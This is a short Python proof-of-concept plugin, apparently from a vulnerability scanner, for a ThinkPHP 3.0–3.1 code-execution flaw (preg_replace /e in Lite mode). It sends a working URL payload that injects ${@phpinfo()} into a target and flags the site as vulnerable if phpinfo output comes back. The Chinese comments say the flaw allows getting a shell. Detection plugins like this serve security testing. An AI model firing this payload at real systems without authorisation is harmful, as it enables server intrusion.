# Author:w8ay
# Name:测试DEMO
'''
name: ThinkPHP 代码执行漏洞
referer: http://zone.wooyun.org/index.php?do=view&id=44
author: Lucifer
description: ThinkPHP 版本3.0~3.1开启Lite模式后preg_replace使用了/e选项，同时第二个参数使用双引号，所以造成了代码执行，可直接GETSHELL
'''
import HackRequests


def poc(arg, **kwargs):
    payload = "/index.php/Index/index/name/$%7B@phpinfo%28%29%7D"
    vulnurl = arg + payload
    try:
        hack = HackRequests.hackRequests()
        hh = hack.http(vulnurl)

        if r"Configuration File (php.ini) Path" in hh.text():
            result = {
                "name": "ThinkPHP 代码执行漏洞",  # 插件名称
                "content": "存在ThinkPHP代码执行漏洞",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": hh.log,
                "tag": "code_eval"  # 漏洞标签
            }
            return result
    except:
        pass


if __name__ == "__main__":
    pass